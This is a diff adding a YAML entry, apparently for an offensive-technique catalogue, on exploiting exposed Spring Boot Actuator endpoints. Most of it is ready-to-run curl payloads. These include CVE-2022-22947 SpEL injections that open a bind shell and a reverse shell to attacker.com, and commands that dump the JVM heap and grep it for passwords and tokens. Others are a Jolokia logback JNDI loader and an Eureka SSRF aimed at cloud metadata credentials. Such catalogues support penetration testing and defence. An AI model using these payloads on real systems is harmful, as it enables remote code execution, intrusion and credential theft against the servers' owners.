@@ -1,0 +1,153 @@
+---
+comment: "Spring Boot Actuator exposes management endpoints (by default under /actuator)\
+  \ that\ncan be abused for information disclosure, SSRF, and code execution. In Spring\
+  \ Boot 2.x,\nonly /actuator/health and /actuator/info are exposed by default; applications\
+  \ configured\nwith management.endpoints.web.exposure.include=* expose all endpoints\
+  \ to the network,\noften without authentication. In Spring Boot 1.x, all endpoints\
+  \ are exposed by default.\n\nThree main exploitation paths:\n1. CVE-2022-22947 (Spring\
+  \ Cloud Gateway) \u2014 SpEL injection in route filter definitions.\n   Unauthenticated\
+  \ if the actuator is exposed; does not require other dependencies.\n2. Jolokia /actuator/jolokia\
+  \ \u2014 JMX-over-HTTP. The reloadByURL action can load a malicious\n   logback.xml\
+  \ containing JNDI directives, triggering RCE on Java < 8u191 / < 11.0.1.\n3. /actuator/env\
+  \ + /actuator/refresh \u2014 set application properties to point to\n   attacker-controlled\
+  \ services (SSRF via Eureka, RCE via H2 datasource query).\n"
+functions:
+  bind-shell:
+  - blind: true
+    code: |
+      curl -s -X POST http://victim.com/actuator/gateway/routes/bindshell \
+        -H 'Content-Type: application/json' \
+        -d '{
+          "id": "bindshell",
+          "filters": [{"name": "AddResponseHeader", "args": {
+            "name": "x",
+            "value": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"ncat -lvp 12345 -e /bin/sh\"})}"
+          }}],
+          "uri": "http://attacker.com"
+        }'
+      curl -s -X POST http://victim.com/actuator/gateway/refresh
+    comment: "CVE-2022-22947: opens a bind shell on TCP port 12345 via SpEL injection.\
+      \ Requires\nncat (nmap package) on the target system. The exec() call runs asynchronously\
+      \ \u2014\nconfirm the port is open before connecting.\n"
+    connector: tcp-client
+    contexts:
+      unauthenticated:
+    tty: false
+    version: |-
+      Spring Cloud Gateway < 3.0.7 / < 3.1.1
+  file-read:
+  - code: |
+      curl -s http://victim.com/actuator/heapdump -o heapdump.bin
+
+      # Extract plaintext secrets from the heap dump:
+      strings heapdump.bin | grep -iE '(password|passwd|secret|token|api.?key|jdbc|Bearer)' | sort -u
+    comment: |
+      /actuator/heapdump downloads a full JVM heap snapshot as a binary file. It frequently
+      contains plaintext credentials, API keys, JWT secrets, database connection strings,
+      and Spring property values held in memory at the time of the dump.
+      For deep analysis, open heapdump.bin in Eclipse Memory Analyzer (MAT) and use OQL:
+        SELECT s.value.toString() FROM java.lang.String s WHERE ...
+    contexts:
+      unauthenticated:
+  - code: |
+      curl -s http://victim.com/actuator/logfile
+    comment: |
+      /actuator/logfile returns the full content of the application log file over HTTP.
+      Stack traces, SQL queries, startup configuration, and datasource credentials are
+      commonly present at DEBUG or INFO level.
+      Requires logging.file.name or logging.file.path to be configured in the app.
+      The Range header is supported for partial reads:
+        curl -r 0-4095 http://victim.com/actuator/logfile
+    contexts:
+      unauthenticated:
+  rce:
+  - code: |
+      # Step 1: create a route with a SpEL expression in the filter arguments
+      curl -s -X POST http://victim.com/actuator/gateway/routes/exploit \
+        -H 'Content-Type: application/json' \
+        -d '{
+          "id": "exploit",
+          "filters": [{"name": "AddResponseHeader", "args": {
+            "name": "result",
+            "value": "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"id\"}).getInputStream()).useDelimiter(\"\\\\A\").next()}"
+          }}],
+          "uri": "http://attacker.com"
+        }'
+
+      # Step 2: trigger SpEL evaluation by refreshing the gateway routes
+      curl -s -X POST http://victim.com/actuator/gateway/refresh
+
+      # Step 3: retrieve command output from the evaluated route definition
+      curl -s http://victim.com/actuator/gateway/routes/exploit
+    comment: |
+      CVE-2022-22947: Spring Cloud Gateway evaluates SpEL expressions in route filter
+      arguments without sanitisation. The AddResponseHeader filter's value field is
+      evaluated as a SpEL expression after /actuator/gateway/refresh is called.
+      Command output is embedded in the route's filter args in the GET response.
+      Ref: https://www.exploit-db.com/exploits/50799
+    contexts:
+      unauthenticated:
+    version: |-
+      Spring Cloud Gateway < 3.0.7 / < 3.1.1
+  - code: |
+      # Step 1: serve a malicious logback.xml from attacker.com:
+      #   <configuration>
+      #     <insertFromJNDI env-entry-name="ldap://attacker.com:1389/exploit" as="appName"/>
+      #   </configuration>
+      #
+      # Step 2: trigger logback to reload config from the attacker server via Jolokia
+      curl -s -X POST http://victim.com/actuator/jolokia \
+        -H 'Content-Type: application/json' \
+        -d '{"mbean":"ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator","type":"EXEC","operation":"reloadByURL","arguments":["http://attacker.com/logback.xml"]}'
+    comment: |
+      The Jolokia reloadByURL action instructs logback to reload its configuration from an
+      arbitrary URL. A malicious logback.xml using insertFromJNDI triggers an LDAP lookup,
+      which loads a remote Java class on vulnerable JVMs (Java < 8u191, < 11.0.1, < 7u201).
+      Requires /actuator/jolokia exposed with the JMXConfigurator MBean registered.
+      Use marshalsec (github.com/mbechler/marshalsec) to host the LDAP exploit server.
+      Ref: https://github.com/mpgn/Spring-Boot-Actuator-Exploit
+    contexts:
+      unauthenticated:
+  reverse-shell:
+  - blind: true
+    code: |
+      # Step 1: inject reverse shell via SpEL in a gateway route
+      curl -s -X POST http://victim.com/actuator/gateway/routes/shell \
+        -H 'Content-Type: application/json' \
+        -d '{
+          "id": "shell",
+          "filters": [{"name": "AddResponseHeader", "args": {
+            "name": "x",
+            "value": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/attacker.com/12345 0>&1\"})}"
+          }}],
+          "uri": "http://attacker.com"
+        }'
+
+      # Step 2: trigger execution
+      curl -s -X POST http://victim.com/actuator/gateway/refresh
+    comment: "CVE-2022-22947: spawns a reverse bash shell via SpEL injection in a\
+      \ Spring Cloud\nGateway route filter. The exec() call runs asynchronously \u2014\
+      \ the HTTP response will\nnot confirm execution. Check the listener for an incoming\
+      \ connection.\n"
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    tty: false
+    version: |-
+      Spring Cloud Gateway < 3.0.7 / < 3.1.1
+  ssrf:
+  - code: "# Set the Eureka registry URL to the attacker's server\ncurl -s -X POST\
+      \ http://victim.com/actuator/env \\\n  -H 'Content-Type: application/json' \\\
+      \n  -d '{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://attacker.com/\"\
+      }'\n\n# Apply the property change \u2014 triggers the outbound Eureka registration\
+      \ request\ncurl -s -X POST http://victim.com/actuator/refresh\n"
+    comment: |
+      Setting eureka.client.serviceUrl.defaultZone causes the Spring Eureka client to
+      make a GET/POST request to the supplied URL on the next refresh or heartbeat.
+      Use this to reach internal services or the cloud metadata endpoint:
+        http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      Requires spring-cloud-starter-netflix-eureka-client on the classpath and both
+      /actuator/env and /actuator/refresh exposed.
+    contexts:
+      unauthenticated:
+...
